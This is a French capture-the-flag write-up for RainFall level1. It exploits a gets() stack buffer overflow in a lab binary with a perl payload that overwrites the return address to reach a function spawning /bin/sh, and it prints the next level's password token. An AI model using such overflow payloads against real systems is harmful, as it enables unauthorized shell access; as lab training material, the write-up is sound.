# level1

Quand on lance le binaire `level`, peu importe le nombre d'argument, on se retrouve dans un prompt.
On peut prompt une valeur, puis le programme exit.

```sh
level1@RainFall:~$ ./level1 
salut
level1@RainFall:~$ ./level1 
423
level1@RainFall:~$ ./level1 test
ouais
level1@RainFall:~$
```

Cette fois ci, l'exécutable peut être décompilé ! Sur ghidra, on repère rapidement ce que l'on va devoir exploiter en voyant ces deux fonctions:
```c
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}



void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

En cherchant des infos sur la fonction `gets`, on trouve très vite des articles qui parlent des problèmes de `gets` avec notamment des buffer overflow. Considérant qu'on a un buffer de 76 charactères qui est déclaré sur la ligne d'au dessus, on comprend vite quelle faille on va devoir exploiter

Après avoir lu [ce très bon article](<https://oxasploits.com/posts/simple-buffer-overflow-exploitation-walkthrough-gdb/>) sur les buffer overflow, on peut commencer à concevoir notre exploit

Notre buffer a une taille de 76 char, on doit donc utiliser un offset de 76 puis envoyer l'adresse de la fonction `run` pour lui faire exécuter le shell

On commence par lancer le binaire avec gdb et utiliser la commande `lay prev`, puis, on scroll un peu plus haut et on trouve l'adresse de la fonction `run`: `0x8048444`

On convertir l'adresse en byte pour la mettre dans le payload en utilisant une [hex escape sequence](<https://www.ibm.com/docs/en/xl-c-and-cpp-aix/16.1?topic=details-hexadecimal-escape-sequence>), ce qui donne `\x44\x84\x04\x08`

On a désormais tout ce qu'il faut pour fabriquer notre payload, on va utiliser ce script perl pour le générer et l'envoyer dans un fichier:
```sh
echo $(perl -e 'print "A"x76 . "\x44\x84\x04\x08";') > /tmp/payload
```

Le script va donc créer une chaine de 76 `A` suivie de l'adresse de la fonction `run` dans le programme

Ensuite, on a plus qu'a faire lire le payload à l'input de notre programme, et on se retrouve dans le shell:
```sh
level1@RainFall:~$ cat /tmp/payload - | ./level1 
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Le `-` dans la commande `cat` sert à faire en sorte que le programme n'exit pas directement au lancement, voir <https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process>